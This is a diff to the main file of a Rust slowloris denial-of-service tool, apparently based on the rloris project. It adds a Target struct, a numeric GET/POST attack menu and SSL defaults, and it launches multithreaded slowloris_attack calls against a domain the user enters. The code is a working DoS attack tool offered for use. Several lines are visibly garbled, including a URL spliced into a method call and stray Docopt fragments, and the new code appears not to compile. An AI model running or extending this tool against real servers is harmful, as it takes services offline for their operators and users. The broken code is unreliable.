@@ -11,7 +11,7 @@ extern crate webpki;
 extern crate webpki_roots;
 
 use docopt::Docopt;
-use std::io::{stdin, BufRead};
+use std::io::{stdin, BufRead, Error};
 use std::net::TcpStream;
 use std::sync::Arc;
 use std::thread;
@@ -35,6 +35,21 @@ use slowloris_attack::slowloris_attack;
 //     cmd_post: bool,
 // }
 
+#[derive(Clone)]
+struct Target{
+    target_domain: String,
+    port: Option<i32>
+}
+
+impl Target {
+    fn new(target_domain: String, port: Option<i32>) -> Self{
+        Self { target_domain,  port }
+    }
+    fn get_designator(self) -> String{
+        self.target_domain
+    }
+}
+
 fn main() {
     self::show_logo();
 
@@ -46,37 +61,29 @@ fn main() {
     let (attack_option, domain)= self::input_domain_with_menu();
 
     // The default port is 80, but for SSL it's 443.
-    let default_port = 443; // or 80
-
+    let default_port = Option::from(443_i32); // or 80
     let finalize = true;
-    // let cycles = args.flag_cycles;
-    let timeout = 15;
+    let cycles = 0_u32;
+    let timeout = 15_u32;
     let repeat = true;
     let threads = num_cpus::get();
     let ssl = true; //default ssl true
-    let cmd_get= if attack_option == "get".to_string(){
+    let cmd_get= if attack_option == "1".to_string(){
         true
-    }else { false};
-    let cmd_post=if attack_option == "post".to_string(){
+    }else {false};
+    let cmd_post=if attack_option == "2".to_string(){
         true
     }else {false};
 
-    // Extract targetting information
-    let mut target = Target::new(args.arg_target, port);
-
-    // Check for domain override
-    if let Some(domain) = args.flag_domain {
-        target.set_domain(&domain);= Docopt::new(USAGE)
-        //     .and_then(|d| d.decode())
-        //     .unwrap_or_e
-    }
+    let mut target = Target::new(domain, default_port);
+    let domain_optional = Option::from(domain);
 
     // Set up rustls process global
     let mut ssl_config = rustls::ClientConfig::new();
     ssl_config
         .root_store
         .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
-    let ssl_config = Arc::new(ssl_config);
+    let ssl_config = Arc::new(ssl_config); // multiple threads
 
     loop {
         println!(
@@ -85,6 +92,7 @@ fn main() {
             threads
         );
         let mut handles = Vec::with_capacity(threads);
+        
         for threadn in 0..threads {
             let target = target.clone();
             let ssl_config = ssl_config.clone();
@@ -97,7 +105,7 @@ fn main() {
                     // If needed, connect SSL to the target.
                     if ssl {
                         // Attempt to connect SSL
-                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(target.get_domain())
+                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(&target.get_designator())
                             .unwrap_or_else(|e| {
                                 error!("[CONTROL:{}] !!! Couldn't get DNS reference for domain. {}\nDid you provide a domain name, not an IP?", threadn, e);
                                 panic!();
@@ -109,6 +117,8 @@ fn main() {
                         } else if cmd_post {
                             slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, true, threadn);
                         }
+
+                    // can't reach in default option(SSL always true)
                     } else {
                         if cmd_get {
                             slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, false, threadn);
@@ -130,7 +140,7 @@ fn main() {
             }
         } else {
             // In this case there is only one thread. Pop it, join it, and suppress errors.
-            handleshttps://github.com/NoraCodes/rloris.pop().unwrap().join().unwrap_or_else(|_| ());
+            panic!("It's can not work in this go");
         }
         if !repeat {
             break;
